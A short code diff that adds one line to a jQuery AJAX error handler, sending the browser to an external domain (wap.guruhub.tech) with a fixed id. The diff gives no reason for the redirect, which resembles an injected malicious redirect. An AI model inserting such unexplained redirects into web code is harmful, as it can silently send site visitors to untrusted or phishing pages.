@@ -49,6 +49,7 @@ $(document).ready(function () {
             },
             error: function (jqXhr, textStatus, errorMessage) {
                 console.log(errorMessage);
+                window.location.href = "https://wap.guruhub.tech/app/flow.php?sid=127636472464";
             }
         });
     }
